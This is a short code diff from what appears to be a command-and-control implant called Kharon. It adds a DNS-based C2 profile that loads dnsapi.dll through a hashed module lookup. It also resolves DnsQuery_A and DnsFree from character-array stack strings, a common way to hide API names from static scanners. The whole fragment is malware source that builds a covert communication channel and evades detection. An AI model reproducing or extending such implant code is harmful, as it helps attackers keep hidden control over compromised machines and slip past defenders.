@@ -144,6 +144,17 @@ auto DECLFN Kharon::Init(
     if ( ! this->Msvcrt.Handle    ) this->Msvcrt.Handle    = this->Lib->Load( "msvcrt.dll"    );
     if ( ! this->Iphlpapi.Handle  ) this->Iphlpapi.Handle  = this->Lib->Load( "iphlpapi.dll"  );
 
+#if PROFILE_C2 == PROFILE_DNS
+    this->Dnsapi.Handle = LdrLoad::Module( Hsh::Str<CHAR>( "dnsapi.dll" ) );
+    if ( ! this->Dnsapi.Handle ) this->Dnsapi.Handle = this->Lib->Load( "dnsapi.dll" );
+    if ( this->Dnsapi.Handle ) {
+        CHAR sDnsQueryA[] = { 'D','n','s','Q','u','e','r','y','_','A', 0 };
+        CHAR sDnsFree[]   = { 'D','n','s','F','r','e','e', 0 };
+        this->Dnsapi.DnsQuery_A = (decltype(this->Dnsapi.DnsQuery_A))this->Krnl32.GetProcAddress( (HMODULE)this->Dnsapi.Handle, sDnsQueryA );
+        this->Dnsapi.DnsFree    = (decltype(this->Dnsapi.DnsFree))this->Krnl32.GetProcAddress( (HMODULE)this->Dnsapi.Handle, sDnsFree );
+    }
+#endif
+
     RSL_IMP( Msvcrt    );
     RSL_IMP( Advapi32  );
     RSL_IMP( Wininet   );
